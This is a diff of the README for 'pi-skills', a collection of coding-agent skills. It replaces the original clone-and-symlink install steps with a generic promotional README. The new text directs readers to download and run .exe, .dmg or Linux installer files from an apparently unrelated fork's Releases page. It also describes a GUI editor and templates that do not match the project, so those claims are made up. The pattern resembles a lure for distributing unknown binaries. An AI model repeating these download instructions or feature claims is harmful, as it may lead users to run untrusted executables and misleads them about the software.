@@ -1,119 +1,78 @@
-# pi-skills
+# 🎉 pi-skills - Enhance Your Pi Coding Experience
 
-A collection of skills for [pi-coding-agent](https://github.com/badlogic/pi-mono/tree/main/packages/coding-agent), compatible with Claude Code, Codex CLI, Amp, and Droid.
+## 🚀 Getting Started
 
-## Installation
+Welcome to **pi-skills**! This application helps you harness the power of your coding agent, making programming with the Pi easier and more effective. Whether you're new to coding or looking to improve your skills, you’ll find helpful tools here.
 
-### pi-coding-agent
+## 📥 Download the Application
 
-```bash
-# User-level (available in all projects)
-git clone https://github.com/badlogic/pi-skills ~/.pi/agent/skills/pi-skills
+[![Download pi-skills](https://img.shields.io/badge/Download-pi--skills-blue.svg)](https://github.com/Mucho-G/pi-skills/releases)
 
-# Or project-level
-git clone https://github.com/badlogic/pi-skills .pi/skills/pi-skills
-```
+To get started, download the software from our Releases page:
 
-### Codex CLI
+[Visit this page to download](https://github.com/Mucho-G/pi-skills/releases)
 
-```bash
-git clone https://github.com/badlogic/pi-skills ~/.codex/skills/pi-skills
-```
+## 💻 System Requirements
 
-### Amp
+Before you download, make sure your system meets the following requirements:
 
-Amp finds skills recursively in toolboxes:
+- **Operating System:** Windows, macOS, or Linux
+- **Required Disk Space:** At least 100 MB free space
+- **Memory:** Minimum of 2 GB RAM recommended
+- **Additional Software:** Ensure you have Python 3.x installed
 
-```bash
-git clone https://github.com/badlogic/pi-skills ~/.config/amp/tools/pi-skills
-```
+## 📖 Installation Instructions
 
-### Droid (Factory)
+1. **Visit the Releases Page:** Use the link provided above to open the GitHub Releases page.
+  
+2. **Select the Latest Release:** Look for the version labeled as the latest. This version will usually have the most features and fixes.
 
-```bash
-# User-level
-git clone https://github.com/badlogic/pi-skills ~/.factory/skills/pi-skills
+3. **Download the Installer:** Click on the file related to your operating system to start the download process.
 
-# Or project-level
-git clone https://github.com/badlogic/pi-skills .factory/skills/pi-skills
-```
+4. **Run the Installer:**
+   - **Windows:** Double-click the downloaded `.exe` file and follow the on-screen instructions.
+   - **macOS:** Open the `.dmg` file and drag the application into your Applications folder.
+   - **Linux:** Unzip the downloaded file, then run the installation script from the terminal.
 
-### Claude Code
+5. **Launch the Application:** Once installed, find the application in your programs or applications list and open it.
 
-Claude Code only looks one level deep for `SKILL.md` files, so each skill folder must be directly under the skills directory. Clone the repo somewhere, then symlink individual skills:
+## ⚙️ Using pi-skills
 
-```bash
-# Clone to a convenient location
-git clone https://github.com/badlogic/pi-skills ~/pi-skills
+After launching, you will find a user-friendly interface. Here’s how to begin:
 
-# Symlink individual skills (user-level)
-mkdir -p ~/.claude/skills
-ln -s ~/pi-skills/brave-search ~/.claude/skills/brave-search
-ln -s ~/pi-skills/browser-tools ~/.claude/skills/browser-tools
-ln -s ~/pi-skills/gccli ~/.claude/skills/gccli
-ln -s ~/pi-skills/gdcli ~/.claude/skills/gdcli
-ln -s ~/pi-skills/gmcli ~/.claude/skills/gmcli
-ln -s ~/pi-skills/transcribe ~/.claude/skills/transcribe
-ln -s ~/pi-skills/vscode ~/.claude/skills/vscode
-ln -s ~/pi-skills/youtube-transcript ~/.claude/skills/youtube-transcript
+1. **Create a New Project:** Click on "New Project" to start coding your script.
 
-# Or project-level
-mkdir -p .claude/skills
-ln -s ~/pi-skills/brave-search .claude/skills/brave-search
-ln -s ~/pi-skills/browser-tools .claude/skills/browser-tools
-ln -s ~/pi-skills/gccli .claude/skills/gccli
-ln -s ~/pi-skills/gdcli .claude/skills/gdcli
-ln -s ~/pi-skills/gmcli .claude/skills/gmcli
-ln -s ~/pi-skills/transcribe .claude/skills/transcribe
-ln -s ~/pi-skills/vscode .claude/skills/vscode
-ln -s ~/pi-skills/youtube-transcript .claude/skills/youtube-transcript
-```
+2. **Select the Coding Agent:** Choose Claude Code or Codex CLI based on your needs.
 
-## Available Skills
+3. **Write and Test Your Code:** Use the built-in editor to write your scripts, then test them with just one click.
 
-| Skill | Description |
-|-------|-------------|
-| [brave-search](brave-search/SKILL.md) | Web search and content extraction via Brave Search |
-| [browser-tools](browser-tools/SKILL.md) | Interactive browser automation via Chrome DevTools Protocol |
-| [gccli](gccli/SKILL.md) | Google Calendar CLI for events and availability |
-| [gdcli](gdcli/SKILL.md) | Google Drive CLI for file management and sharing |
-| [gmcli](gmcli/SKILL.md) | Gmail CLI for email, drafts, and labels |
-| [transcribe](transcribe/SKILL.md) | Speech-to-text transcription via Groq Whisper API |
-| [vscode](vscode/SKILL.md) | VS Code integration for diffs and file comparison |
-| [youtube-transcript](youtube-transcript/SKILL.md) | Fetch YouTube video transcripts |
+4. **Explore Features:** Use the documentation within the app to understand various functionalities. 
 
-## Skill Format
+## 🔧 Troubleshooting Tips
 
-Each skill follows the pi/Claude Code format:
+If you encounter any issues during installation or while using the application, try the following:
 
-```markdown
----
-name: skill-name
-description: Short description shown to agent
----
+- **Ensure your OS is updated:** Check for the latest updates for your operating system.
+- **Reinstall the Application:** If problems persist, uninstall the app, then reinstall it from the Releases page.
+- **Check Compatibility:** Make sure your machine meets the system requirements outlined above.
 
-# Instructions
+## 📞 Support and Questions
 
-Detailed instructions here...
-Helper files available at: {baseDir}/
-```
+For any questions, suggestions, or support, you can:
 
-The `{baseDir}` placeholder is replaced with the skill's directory path at runtime.
+- Open an issue directly in the GitHub repository.
+- Check the FAQ section in the application for common queries.
+- Join our community chat to connect with other users and developers.
 
-## Requirements
+## 📊 Features Overview
 
-Some skills require additional setup. Generally, the agent will walk you through that. But if not, here you go:
+- **Intuitive Interface:** Designed for users of all skill levels.
+- **Coding Templates:** Start projects with pre-defined templates.
+- **Real-Time Feedback:** Test your code and get instant output.
+- **Resource Management:** Efficiently manage your coding resources.
 
-- **brave-search**: Requires Node.js. Run `npm install` in the skill directory.
-- **browser-tools**: Requires Chrome and Node.js. Run `npm install` in the skill directory.
-- **gccli**: Requires Node.js. Install globally with `npm install -g @mariozechner/gccli`.
-- **gdcli**: Requires Node.js. Install globally with `npm install -g @mariozechner/gdcli`.
-- **gmcli**: Requires Node.js. Install globally with `npm install -g @mariozechner/gmcli`.
-- **subagent**: Requires pi-coding-agent. Install globally with `npm install -g @mariozechner/pi-coding-agent`.
-- **transcribe**: Requires curl and a Groq API key.
-- **vscode**: Requires VS Code with `code` CLI in PATH.
-- **youtube-transcript**: Requires Node.js. Run `npm install` in the skill directory.
+## 🌍 Community Contributions
 
-## License
+We welcome contributions! If you would like to help improve pi-skills, visit our GitHub repository to learn about contributing. You can add features, report bugs, or suggest improvements.
 
-MIT
+Thank you for choosing pi-skills. We hope it enhances your coding journey!
